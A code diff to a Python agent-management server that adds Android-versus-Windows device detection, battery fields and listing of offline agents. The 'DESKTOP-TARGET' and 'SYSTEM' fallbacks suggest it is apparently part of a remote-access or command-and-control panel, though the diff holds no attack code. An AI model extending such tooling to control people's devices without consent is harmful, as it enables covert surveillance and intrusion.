@@ -155,6 +155,13 @@ class ConnectedAgent:
         current_tag = self.client_info.get("endpoint_tag")
         if current_tag:
             info["endpoint_tag"] = current_tag
+        # Preserve Android flags & metadata across heartbeats
+        if self.client_info.get("is_android") or "android" in str(self.client_info.get("arch", "")).lower() or "android" in str(self.client_info.get("os", "")).lower():
+            info["is_android"] = True
+            info["arch"] = "android"
+            info["os"] = "Android device"
+            info["platform"] = "android"
+            info["device_type"] = "phone"
         self.client_info.update(info)
         self.last_heartbeat = time.time()
 
@@ -165,19 +172,68 @@ class ConnectedAgent:
         agent_hash = self.client_info.get("code_hash", "")
         has_update = bool(server_hash and agent_hash and server_hash != agent_hash)
 
+        # Precise Android vs Windows detection
+        arch_str = str(self.client_info.get("arch", "")).lower()
+        os_str = str(self.client_info.get("os", "")).lower()
+        platform_str = str(self.client_info.get("platform", "")).lower()
+        dev_type = str(self.client_info.get("device_type", "")).lower()
+
+        is_android = (
+            self.client_info.get("is_android") is True or
+            "android" in arch_str or
+            "android" in os_str or
+            "android" in platform_str or
+            "phone" in dev_type
+        )
+
+        if not is_android:
+            try:
+                from .registry import AgentRegistry
+                pkg = AgentRegistry.get_package(self.agent_id)
+                if pkg:
+                    pkg_arch = str(pkg.get("arch", "")).lower()
+                    if "android" in pkg_arch or pkg.get("apk_filename") or pkg.get("sh_filename"):
+                        is_android = True
+            except Exception:
+                pass
+
+        if is_android:
+            resolved_os = "Android device"
+            resolved_arch = "android"
+            fallback_hostname = self.client_info.get("device_name") or "Android Phone"
+            fallback_username = "Android"
+            cpu_val = self.client_info.get("cpu", "ARM64")
+        else:
+            resolved_os = self.client_info.get("os", "Windows")
+            resolved_arch = self.client_info.get("arch", "x64")
+            fallback_hostname = "DESKTOP-TARGET"
+            fallback_username = "SYSTEM"
+            cpu_val = self.client_info.get("cpu", "Unknown")
+
+        raw_hostname = self.client_info.get("hostname")
+        hostname_val = raw_hostname if (raw_hostname and raw_hostname != "Unknown") else fallback_hostname
+        raw_username = self.client_info.get("username")
+        username_val = raw_username if (raw_username and raw_username != "Unknown") else fallback_username
+
         return {
             "agent_id": self.agent_id,
             "device_id": self.client_info.get("device_id", ""),
             "installation_id": self.client_info.get("installation_id", ""),
             "endpoint_tag": self.client_info.get("endpoint_tag", self.client_info.get("tag", "")),
             "status": "online",
-            "hostname": self.client_info.get("hostname", "Unknown"),
-            "username": self.client_info.get("username", "Unknown"),
-            "os": self.client_info.get("os", "Windows"),
-            "arch": self.client_info.get("arch", "x64"),
+            "hostname": hostname_val,
+            "username": username_val,
+            "os": resolved_os,
+            "arch": resolved_arch,
+            "platform": "android" if is_android else "windows",
+            "is_android": is_android,
+            "device_name": self.client_info.get("device_name", hostname_val),
+            "device_type": "phone" if is_android else "desktop",
+            "battery": self.client_info.get("battery"),
+            "battery_charging": self.client_info.get("battery_charging"),
             "ram_gb": self.client_info.get("ram_gb", 0),
-            "cpu": self.client_info.get("cpu", "Unknown"),
-            "local_ip": self.client_info.get("local_ip", "127.0.0.1"),
+            "cpu": cpu_val,
+            "local_ip": self.client_info.get("local_ip", self.client_info.get("ip", "127.0.0.1")),
             "public_ip": self.client_info.get("public_ip", ""),
             "connected_at": self.connected_at,
             "last_heartbeat": self.last_heartbeat,
@@ -214,10 +270,40 @@ class AgentManager:
             existing_tag = self.registered_agents[agent_id].get("endpoint_tag")
             if existing_tag:
                 info["endpoint_tag"] = existing_tag
+            if self.registered_agents[agent_id].get("is_android"):
+                info["is_android"] = True
+                info["arch"] = "android"
+                info["os"] = "Android device"
+                info["platform"] = "android"
+                info["device_type"] = "phone"
         elif agent_id in self.active_agents:
             existing_tag = self.active_agents[agent_id].client_info.get("endpoint_tag")
             if existing_tag:
                 info["endpoint_tag"] = existing_tag
+            if self.active_agents[agent_id].client_info.get("is_android"):
+                info["is_android"] = True
+                info["arch"] = "android"
+                info["os"] = "Android device"
+                info["platform"] = "android"
+                info["device_type"] = "phone"
+
+        # Check AgentRegistry if platform not yet marked
+        if not info.get("is_android"):
+            try:
+                from .registry import AgentRegistry
+                pkg = AgentRegistry.get_package(agent_id)
+                if pkg:
+                    pkg_arch = str(pkg.get("arch", "")).lower()
+                    if "android" in pkg_arch or pkg.get("apk_filename") or pkg.get("sh_filename"):
+                        info["is_android"] = True
+                        info["arch"] = "android"
+                        info["os"] = "Android device"
+                        info["platform"] = "android"
+                        info["device_type"] = "phone"
+                    if not info.get("endpoint_tag") and pkg.get("endpoint_tag"):
+                        info["endpoint_tag"] = pkg.get("endpoint_tag")
+            except Exception:
+                pass
 
         now = time.time()
         if agent_id in self.active_agents:
@@ -278,6 +364,7 @@ class AgentManager:
                 results.append(self.active_agents[aid].to_dict())
             else:
                 data["status"] = "offline"
+                results.append(data)
         # Stable sort: Online first, then by endpoint tag, hostname, and agent_id (prevents shuffling on heartbeats)
         return sorted(
             results,
